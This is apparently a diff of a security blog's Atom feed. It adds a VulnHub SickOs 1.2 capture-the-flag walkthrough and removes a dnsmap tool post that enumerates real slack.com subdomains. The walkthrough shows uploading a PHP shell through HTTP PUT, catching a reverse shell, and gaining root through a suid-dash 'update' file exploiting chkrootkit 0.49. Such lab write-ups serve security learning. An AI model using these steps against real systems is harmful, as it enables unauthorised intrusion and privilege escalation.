@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-07-02T09:34:48-04:00</updated>
+  <updated>2017-07-04T06:51:18-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,202 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SickOs 1.2 writeup]]></title>
+    <link href="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/"/>
+    <updated>2017-07-03T04:20:13-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:</p>
+
+<p>```
+nmap -T4 -p22,80 -sV 192.168.217.146</p>
+
+<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-03 09:11 EDT
+Nmap scan report for 192.168.217.146
+Host is up (0.00030s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    lighttpd 1.4.28
+```</p>
+
+<p>The web server serves this pic:</p>
+
+<p><img class="center" src="/images/pentest/sickos/2-blow.jpg" title="&lsquo;web server&rsquo; &lsquo;webpage&rsquo;" ></p>
+
+<p>Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:</p>
+
+<p>```</p>
+
+<!-- NOTHING IN HERE ///\\\ -->
+
+
+<blockquote><blockquote><blockquote><p>```</p></blockquote></blockquote></blockquote>
+
+<p>I tried constructing a path out of the comment, but didn&rsquo;t get anywhere. Searching for an exploit for the lighttpd server version didn&rsquo;t yield anything either, although I found some for other versions.</p>
+
+<p>Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :&ndash;) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn&rsquo;t always require sophisticated mechanisms and PHP vulnerabilities and the like. It&rsquo;s just as simple as using a certain HTTP method that you don&rsquo;t see too often: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">PUT</a></p>
+
+<p>First, I needed to verify if PUT is allowed in the first place:</p>
+
+<p><code>
+nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
+PORT   STATE SERVICE
+80/tcp open  http
+| http-methods:
+|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
+|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
+|_  Path tested: /test
+</code></p>
+
+<p>Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT'ing things on a server:</p>
+
+<p>```
+nmap -p 80 192.168.217.146 &mdash;script http-put &mdash;script-args http-put.url=&lsquo;/test/shell.php&rsquo;,http-put.file=&lsquo;/root/Desktop/shell.php&rsquo;</p>
+
+<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-04 04:36 EDT
+Nmap scan report for 192.168.217.146
+Host is up (0.00031s latency).
+PORT   STATE SERVICE
+80/tcp open  http
+|_http-put: /test/shell.php was successfully created
+```</p>
+
+<p>All didn&rsquo;t work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I&rsquo;m not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:</p>
+
+<p><code>
+nc -vnlp 443
+listening on [any] 443 ...
+connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
+Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+ 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+</code></p>
+
+<p>Next, I did some enumeration. The usual culprits didn&rsquo;t stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:</p>
+
+<p>```
+$ ls -al /etc/cron*
+-rw-r&mdash;r&mdash; 1 root root  722 Jun 19  2012 /etc/crontab</p>
+
+<p>ls: cannot open directory /etc/cron.d: Permission denied
+/etc/cron.daily:
+total 72
+drwxr-xr-x  2 root root  4096 Apr 12  2016 .
+drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
+-rw-r&mdash;r&mdash;  1 root root   102 Jun 19  2012 .placeholder
+-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
+-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
+-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
+-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
+-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
+-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
+-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
+-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
+-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
+-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
+```</p>
+
+<p>The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find <a href="https://www.exploit-db.com/exploits/33899/">one</a> right away. The vulnerable version is 0.49. I checked which version is installed on the system:</p>
+
+<p><code>
+$ chkrootkit -V
+chkrootkit version 0.49
+</code></p>
+
+<p>Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named &lsquo;update&rsquo; with non-root owner in /tmp</p>
+
+<p>So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:</p>
+
+<p>```
+$ cat /etc/shells</p>
+
+<h1>/etc/shells: valid login shells</h1>
+
+<p>/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+$ ls -l /bin/*sh
+-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
+-rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
+lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash &ndash;> bash
+lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh &ndash;> dash
+lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh &ndash;> busybox
+```</p>
+
+<p>I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn&rsquo;t work. What worked was making dash suid and also spawning a TTY shell with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</code>.</p>
+
+<p>Inside the update file, I just made <em>/bin/dash</em> suid:</p>
+
+<p>```
+$ cat update</p>
+
+<h1>!/bin/bash</h1>
+
+<p>chmod u+s /bin/dash
+```</p>
+
+<p>Then I waited a minute for cron to run and got root:</p>
+
+<p>```
+$ /bin/dash
+/bin/dash</p>
+
+<h1>whoami</h1>
+
+<p>whoami
+root
+```</p>
+
+<p>Besides the flag, in the root directory there was rule file for iptables that explained the VM&rsquo;s behavior. Anyway, here&rsquo;s the flag:</p>
+
+<p>```</p>
+
+<h1>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</h1>
+
+<p>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+WoW! If you are viewing this, You have &ldquo;Sucessfully!!&rdquo; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</p>
+
+<p>Thanks for giving this try.</p>
+
+<p>@vulnhub: Thanks for hosting this UP!.
+```</p>
+
+<p>This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ Tomorrow will be cancelled due to lack \
+\ of interest.                           /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[TheHarvester - Kali Linux tools]]></title>
@@ -100,7 +296,7 @@ Google API key and CSE ID in the plugin (discovery/googleCSE.py)</p>
 <li>TheHarvester Ver. 2.7                                           *</li>
 <li>Coded by Christian Martorella                                   *</li>
 <li>Edge-Security Research                                          *</li>
-<li><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#99;&#109;&#97;&#114;&#x74;&#x6f;&#114;&#x65;&#108;&#108;&#x61;&#64;&#101;&#x64;&#x67;&#101;&#45;&#115;&#101;&#x63;&#x75;&#x72;&#105;&#x74;&#x79;&#x2e;&#99;&#111;&#x6d;">&#x63;&#x6d;&#x61;&#114;&#x74;&#x6f;&#x72;&#x65;&#x6c;&#108;&#x61;&#x40;&#x65;&#100;&#x67;&#x65;&#x2d;&#x73;&#x65;&#x63;&#x75;&#114;&#x69;&#116;&#121;&#46;&#x63;&#111;&#x6d;</a>                                   *</li>
+<li><a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x63;&#x6d;&#x61;&#x72;&#116;&#x6f;&#114;&#x65;&#x6c;&#x6c;&#97;&#64;&#x65;&#100;&#x67;&#x65;&#x2d;&#x73;&#101;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2e;&#99;&#x6f;&#109;">&#x63;&#109;&#x61;&#114;&#x74;&#x6f;&#x72;&#101;&#x6c;&#108;&#x61;&#64;&#101;&#x64;&#x67;&#x65;&#45;&#x73;&#101;&#x63;&#x75;&#x72;&#x69;&#116;&#121;&#46;&#x63;&#x6f;&#x6d;</a>                                   *</li>
 </ul>
 
 
@@ -158,7 +354,7 @@ theharvester -d hackerone.com -l 200 -b all -f harvested</p>
 <li>TheHarvester Ver. 2.7                                           *</li>
 <li>Coded by Christian Martorella                                   *</li>
 <li>Edge-Security Research                                          *</li>
-<li><a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x63;&#x6d;&#x61;&#114;&#116;&#x6f;&#x72;&#x65;&#x6c;&#108;&#97;&#64;&#x65;&#x64;&#x67;&#101;&#45;&#115;&#101;&#99;&#x75;&#114;&#105;&#116;&#x79;&#x2e;&#99;&#111;&#x6d;">&#x63;&#x6d;&#97;&#114;&#116;&#111;&#114;&#x65;&#x6c;&#108;&#97;&#x40;&#101;&#100;&#103;&#101;&#45;&#115;&#101;&#99;&#x75;&#114;&#x69;&#x74;&#x79;&#x2e;&#99;&#111;&#109;</a>                                   *</li>
+<li><a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#99;&#109;&#x61;&#x72;&#116;&#111;&#x72;&#x65;&#x6c;&#x6c;&#97;&#64;&#101;&#100;&#x67;&#x65;&#45;&#115;&#x65;&#99;&#x75;&#114;&#105;&#116;&#121;&#x2e;&#99;&#x6f;&#109;">&#x63;&#109;&#97;&#x72;&#116;&#x6f;&#114;&#101;&#x6c;&#x6c;&#97;&#64;&#x65;&#100;&#103;&#x65;&#x2d;&#x73;&#x65;&#99;&#117;&#114;&#x69;&#116;&#121;&#x2e;&#99;&#x6f;&#x6d;</a>                                   *</li>
 </ul>
 
 
@@ -192,8 +388,8 @@ Searching 250 results...
 
 <h2>[+] Emails found:</h2>
 
-<p><a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x66;&#101;&#101;&#100;&#98;&#97;&#99;&#107;&#x40;&#104;&#97;&#x63;&#x6b;&#101;&#x72;&#111;&#x6e;&#x65;&#x2e;&#99;&#111;&#x6d;">&#102;&#101;&#101;&#100;&#x62;&#97;&#x63;&#x6b;&#x40;&#104;&#x61;&#x63;&#107;&#x65;&#x72;&#111;&#x6e;&#101;&#x2e;&#99;&#x6f;&#109;</a>
-<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#115;&#117;&#112;&#x70;&#x6f;&#114;&#116;&#x40;&#x68;&#x61;&#99;&#x6b;&#101;&#x72;&#111;&#x6e;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#x73;&#x75;&#x70;&#x70;&#111;&#x72;&#x74;&#64;&#104;&#97;&#99;&#x6b;&#101;&#x72;&#111;&#x6e;&#101;&#x2e;&#99;&#x6f;&#109;</a>
+<p><a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#102;&#101;&#101;&#x64;&#x62;&#97;&#x63;&#107;&#64;&#x68;&#97;&#99;&#107;&#x65;&#114;&#111;&#x6e;&#x65;&#46;&#x63;&#111;&#109;">&#x66;&#x65;&#101;&#x64;&#98;&#97;&#x63;&#x6b;&#64;&#x68;&#x61;&#99;&#107;&#x65;&#x72;&#x6f;&#x6e;&#x65;&#46;&#x63;&#x6f;&#109;</a>
+<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#115;&#x75;&#x70;&#112;&#x6f;&#114;&#116;&#x40;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x6f;&#110;&#101;&#x2e;&#x63;&#111;&#x6d;">&#x73;&#x75;&#112;&#112;&#x6f;&#114;&#116;&#x40;&#x68;&#97;&#99;&#107;&#x65;&#114;&#x6f;&#x6e;&#101;&#46;&#x63;&#111;&#x6d;</a>
 [REDACTED}</p>
 
 <h2>[+] Hosts found in search engines:</h2>
@@ -236,7 +432,7 @@ theharvester -d cisco.com -b linkedin -l 100 -f cisco</p>
 <li>TheHarvester Ver. 2.7                                           *</li>
 <li>Coded by Christian Martorella                                   *</li>
 <li>Edge-Security Research                                          *</li>
-<li><a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#99;&#109;&#97;&#x72;&#x74;&#x6f;&#x72;&#x65;&#x6c;&#108;&#x61;&#x40;&#101;&#x64;&#103;&#x65;&#x2d;&#115;&#101;&#x63;&#117;&#114;&#105;&#116;&#121;&#46;&#x63;&#111;&#109;">&#99;&#x6d;&#97;&#114;&#x74;&#111;&#x72;&#101;&#x6c;&#108;&#x61;&#x40;&#x65;&#x64;&#x67;&#101;&#x2d;&#115;&#x65;&#99;&#117;&#114;&#105;&#x74;&#x79;&#46;&#x63;&#x6f;&#x6d;</a>                                   *</li>
+<li><a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#99;&#x6d;&#97;&#x72;&#116;&#111;&#x72;&#x65;&#108;&#108;&#x61;&#x40;&#101;&#x64;&#x67;&#101;&#x2d;&#115;&#x65;&#x63;&#117;&#114;&#x69;&#x74;&#121;&#46;&#99;&#111;&#x6d;">&#x63;&#109;&#97;&#114;&#116;&#x6f;&#114;&#101;&#x6c;&#108;&#x61;&#x40;&#x65;&#100;&#x67;&#101;&#45;&#x73;&#x65;&#99;&#x75;&#114;&#x69;&#x74;&#121;&#46;&#99;&#111;&#109;</a>                                   *</li>
 </ul>
 
 
@@ -277,7 +473,7 @@ theharvester -d chousensha.github.io -l 10 -b twitter</p>
 <li>TheHarvester Ver. 2.7                                           *</li>
 <li>Coded by Christian Martorella                                   *</li>
 <li>Edge-Security Research                                          *</li>
-<li><a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#99;&#109;&#97;&#x72;&#116;&#111;&#114;&#x65;&#x6c;&#x6c;&#97;&#64;&#101;&#x64;&#103;&#101;&#45;&#115;&#x65;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#46;&#x63;&#111;&#109;">&#x63;&#109;&#97;&#x72;&#116;&#x6f;&#114;&#101;&#x6c;&#x6c;&#x61;&#64;&#x65;&#100;&#103;&#x65;&#45;&#x73;&#x65;&#x63;&#117;&#114;&#x69;&#x74;&#121;&#x2e;&#99;&#111;&#x6d;</a>                                   *</li>
+<li><a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x63;&#109;&#x61;&#114;&#116;&#111;&#x72;&#x65;&#x6c;&#x6c;&#x61;&#x40;&#101;&#100;&#x67;&#x65;&#45;&#115;&#x65;&#99;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2e;&#x63;&#x6f;&#x6d;">&#99;&#109;&#97;&#114;&#116;&#x6f;&#114;&#101;&#108;&#x6c;&#x61;&#x40;&#101;&#100;&#103;&#101;&#45;&#x73;&#x65;&#99;&#117;&#x72;&#x69;&#x74;&#121;&#x2e;&#99;&#x6f;&#109;</a>                                   *</li>
 </ul>
 
 
@@ -1458,137 +1654,6 @@ Thanks for Trying
 <hr />
 
 <p>&lt; You will outgrow your usefulness. ></p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[dnsmap - Kali Linux tools]]></title>
-    <link href="http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools/"/>
-    <updated>2017-06-27T04:12:46-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools</id>
-    <content type="html"><![CDATA[<p>Today we&rsquo;ll explore another tool for DNS enumeration: the DNS Network Mapper (dnsmap). Although at the time of this post, its last update was in 2010, this tool has survived the passage of time, and has been packaged with versions of both Backtrack and Kali. There is quite a wealth of information about the tool on its homepage, and it comes with a built-in wordlist for domain bruteforcing.</p>
-
-<p>Homepage: <a href="https://github.com/makefu/dnsmap">https://github.com/makefu/dnsmap</a></p>
-
-<!-- more -->
-
-
-<h2>dnsmap description</h2>
-
-<blockquote><p>dnsmap was originally released back in 2006 and was inspired by the
-fictional story &ldquo;The Thief No One Saw&rdquo; by Paul Craig, which can be found
-in the book &ldquo;Stealing the Network &ndash; How to 0wn the Box&rdquo;</p>
-
-<p>dnsmap is mainly meant to be used by pentesters during the information
-gathering/enumeration phase of infrastructure security assessments. During the
-enumeration stage, the security consultant would typically discover the target
-company&rsquo;s IP netblocks, domain names, phone numbers, etc &hellip;</p>
-
-<p>Subdomain brute-forcing is another technique that should be used in the
-enumeration stage, as it&rsquo;s especially useful when other domain enumeration
-techniques such as zone transfers don&rsquo;t work (I rarely see zone transfers
-being <em>publicly</em> allowed these days by the way).</p>
-
-<p>LIMITATIONS</p>
-
-<p>Lack of multi-threading. This speed issue will hopefully be resolved in future versions.</p>
-
-<p>FUN THINGS THAT CAN HAPPEN</p>
-
-<ol>
-<li><p>Finding interesting remote access servers (e.g.: <a href="https://extranet.targetdomain.com">https://extranet.targetdomain.com</a>)</p></li>
-<li><p>Finding badly configured and/or unpatched servers (e.g.: test.targetdomain.com)</p></li>
-<li><p>Finding new domain names which will allow you to map non-obvious/hard-to-find netblocks
-of your target organization (registry lookups &ndash; aka whois is your friend)</p></li>
-<li><p>Sometimes you find that some bruteforced subdomains resolve to internal IP addresses
-(RFC 1918). This is great as sometimes they are real up-to-date &ldquo;A&rdquo; records which means
-that it <em>is</em> possible to enumerate internal servers of a target organization from the
-Internet by only using standard DNS resolving (as oppossed to zone transfers for instance).</p></li>
-<li><p>Discover embedded devices configured using Dynamic DNS services (e.g.: linksys-cam.com).
-This method is an alternative to finding devices via Google hacking techniques</p></li>
-</ol>
-
-
-<p>USAGE</p>
-
-<p>Bruteforcing can be done either with dnsmap&rsquo;s built-in wordlist or a user-supplied wordlist.
-Results can be saved in CSV and human-readable format for further processing. dnsmap does
-NOT require root privileges to be run, and should NOT be run with such privileges for security reasons.</p></blockquote>
-
-<h2>dnsmap options</h2>
-
-<p>```
-dnsmap 0.30 &ndash; DNS Network Mapper by pagvac (gnucitizen.org)</p>
-
-<p>usage: dnsmap &lt;target-domain> [options]
-options:
--w &lt;wordlist-file>
--r &lt;regular-results-file>
--c &lt;csv-results-file>
--d &lt;delay-millisecs>
--i &lt;ips-to-ignore> (useful if you&rsquo;re obtaining false positives)</p>
-
-<p>e.g.:
-dnsmap target-domain.foo
-dnsmap target-domain.foo -w yourwordlist.txt -r /tmp/domainbf_results.txt
-dnsmap target-fomain.foo -r /tmp/ -d 3000
-dnsmap target-fomain.foo -r ./domainbf_results.txt
-```</p>
-
-<h2>dnsmap usage</h2>
-
-<p>```
-dnsmap slack.com
-dnsmap 0.30 &ndash; DNS Network Mapper by pagvac (gnucitizen.org)</p>
-
-<p>[+] warning: domain might use wildcards. 54.230.203.126 will be ignored from results
-[+] searching (sub)domains for slack.com using built-in wordlist
-[+] using maximum random delay of 10 millisecond(s) between requests</p>
-
-<p>email.slack.com
-IP address #1: 34.196.74.192
-IP address #2: 54.88.163.82</p>
-
-<p>files.slack.com
-IP address #1: 52.85.178.60</p>
-
-<p>qa.slack.com
-IP address #1: 54.192.201.191</p>
-
-<p>staging.slack.com
-IP address #1: 52.87.251.252</p>
-
-<p>upload.slack.com
-IP address #1: 34.197.50.42
-IP address #2: 52.22.100.1
-IP address #3: 52.44.55.102
-IP address #4: 52.54.239.215</p>
-
-<p>[+] 5 (sub)domains and 9 IP address(es) found
-[+] completion time: 122 second(s)
-```</p>
-
-<p>Here is how the output looks in the CSV format:</p>
-
-<p><img class="center" src="/images/tools/dnsmap.png" title="&lsquo;dnsmap&rsquo; &lsquo;dnsmap CSV report&rsquo;" ></p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ In the stairway of life, you&rsquo;d best \
-\ take the elevator.                  /</p>
 
 <hr />
 
